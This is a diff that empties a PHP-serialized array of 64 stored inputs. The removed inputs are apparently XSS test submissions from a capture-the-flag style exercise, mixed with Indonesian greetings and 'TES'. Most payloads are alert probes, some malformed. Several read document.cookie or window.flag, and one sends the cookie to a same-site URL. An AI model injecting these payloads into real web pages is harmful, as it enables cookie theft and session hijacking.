@@ -1,16 +1,1 @@
-a:64:{i:0;s:2:"as";i:1;s:2:"as";i:2;s:2:"as";i:3;s:2:"as";i:4;s:2:"as";i:5;s:29:"<script>alert('XSS')</script>";i:6;s:32:"<img src=x onerror=alert('XSS')>";i:7;s:32:"<img src=x onerror=alert('XSS')>";i:8;s:22:"Halo <b>semuanya</b>
-";i:9;s:22:"Halo <b>semuanya</b>
-";i:10;s:4:"Halo";i:11;s:4:"Halo";i:12;s:31:"<svg/onload=alert('MilikSaya')>";i:13;s:28:"<img src=x onerror=alert(2)>";i:14;s:28:"<img src=x onerror=alert(2)>";i:15;s:31:"<img src=x onerror=alert(flag)>";i:16;s:31:"<img src=x onerror=alert(flag)>";i:17;s:44:"<img src=x onerror="alert(document.cookie)">";i:18;s:44:"<img src=x onerror="alert(document.cookie)">";i:19;s:44:"<img src=x onerror="alert(document.cookie)">";i:20;s:78:"<img src=x onerror="alert(window.flag || 'Flag tidak ditemukan di variabel')">";i:21;s:3:"TES";i:22;s:3:"TES";i:23;s:3:"TES";i:24;s:3:"TES";i:25;s:3:"TES";i:26;s:39:"<script>alert{document.cookie}</script>";i:27;s:39:"<script>alert{document.cookie}</script>";i:28;s:3:"TES";i:29;s:39:"<script>alert{document.cookie}</script>";i:30;s:38:"<script>aler{document.cookie}</script>";i:31;s:42:"<script>alert {document . cookie}</script>";i:32;s:42:"<script>alert {document . cookie}</script>";i:33;s:3:"TES";i:34;s:42:"<script>alert {document . cookie}</script>";i:35;s:42:"<script>alert {document . cookie}</script>";i:36;s:50:"BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>";i:37;s:52:"<a onmouseover="alert(document.cookie)">xxs link</a>";i:38;s:52:"<a onmouseover="alert(document.cookie)">xxs link</a>";i:39;s:50:"<a onmouseover=alert(document.cookie)>xxs link</a>";i:40;s:42:"
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">";i:41;s:42:"
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">";i:42;s:42:"
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">";i:43;s:31:"<img src=x oneerror=alert(1)>
-";i:44;s:31:"<img src=x oneerror=alert(1)>
-";i:45;s:29:"<img src=x oneerror=alert(1)>";i:46;s:25:"<script>alert(1)</script>";i:47;s:25:"<script>alert(1)</script>";i:48;s:25:"<script>alert(1)</script>";i:49;s:28:"<img src=x onerror=alert(1)>";i:50;s:39:"<script>alert(document.cookie)</script>";i:51;s:39:"<script>alert(document.cookie)</script>";i:52;s:47:"<script>alert(document.body.innerHTML)</script>";i:53;s:35:"<script>alert(window.flag)</script>";i:54;s:35:"<script>alert(window.flag)</script>";i:55;s:35:"<script>alert(window.flag)</script>";i:56;s:103:"<script>
-if(document.body.innerText.includes("IDS")){
-  alert(document.body.innerText);
-}
-</script>";i:57;s:47:"<script>
-alert(Object.keys(window))
-</script>";i:58;s:61:"<script>
-document.location='/?x='+document.cookie
-</script>";i:59;s:5:"hello";i:60;s:32:"<img src=x onerror=alert('XSS')>";i:61;s:33:"<img src=x onerror=alert('test')>";i:62;s:28:"<img src=x onerror=alert(1)>";i:63;s:28:"<img src=x onerror=alert(1)>";}
+a:0:{}
